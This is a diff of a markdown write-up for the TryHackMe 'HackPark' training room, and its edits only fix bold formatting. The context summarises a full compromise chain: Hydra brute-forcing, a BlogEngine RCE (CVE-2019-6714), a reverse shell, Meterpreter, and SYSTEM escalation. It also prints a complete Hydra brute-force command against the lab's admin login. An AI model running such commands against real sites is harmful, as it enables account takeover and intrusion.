@@ -7,7 +7,7 @@
 - **Link**: https://tryhackme.com/room/hackpark
 
 ## Challenge Description 
->**Brute-force a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!
+>**Brute-force a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!**
 
 ## Resolution Summary 
 **We discovered available services with an ``Nmap`` scan, revealing an HTTP web application and an RDP service. We intercepted the login request with ``Burp Suite ``and brute-forced the credentials with ``Hydra``. Once logged in, we identified the CMS as ``BlogEngine`` 3.3.6.0 and exploited it using a public Directory Traversal / RCE exploit (``CVE-2019-6714``) to obtain a reverse shell. We then upgraded it to a ``Meterpreter`` session and escalated our privileges to SYSTEM via ``getsystem``, a world-writable service binary, and ``WinPEAS``.**
@@ -39,7 +39,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 - **Nothing stood out from inspecting the web application and the Source page, except for the login portal, which we can attempt to brute-force.** 
 
 - **First, we wanted to inspect the login request. For that purpose, we used Burp Suite to intercept one and inspect it with the Repeater module.**
-- **Once we identified the relevant fields, we attempted a brute force attack using `Hydra`:
+- **Once we identified the relevant fields, we attempted a brute force attack using `Hydra`:**
 ```bash
 hydra -l admin -P /home/kali/Downloads/rockyou.txt 10.10.164.221 http-post-form '/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=w8EJbM6L2oQPkEK0WitmXoIPrfSpbm1n1lSOJ9RXNVbQzDqOPOvxb7HFl%2BCtP6jT5489sybaEaCfEbuaCYGvtyK0%2F94SjPIgqqQ7b%2Bdq3bgszLEx8zNI8rpbSLb%2B1wgSBIw1mEG2ScXyHz4w2sT9f9R06S30zmKL%2F3niwA5djJALT8ba&__EVENTVALIDATION=wAbd3ZuBTfc5PWr6OYw5Lq4EWJ%2FQahVpr99vgufwt5FXD30%2F%2B9HKHZfNClSgfkyHy0U4dsKUPrgEJm%2FDcX3u8Ull2OKB0IzXM6lCnbMpC9sEPl1YbAfdfEKSJniGiNX75DKQCa4CA7Z7ZRa7EnbIALATnI19kZbsrvBgFPMcfTxNibEY&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed'
 ```
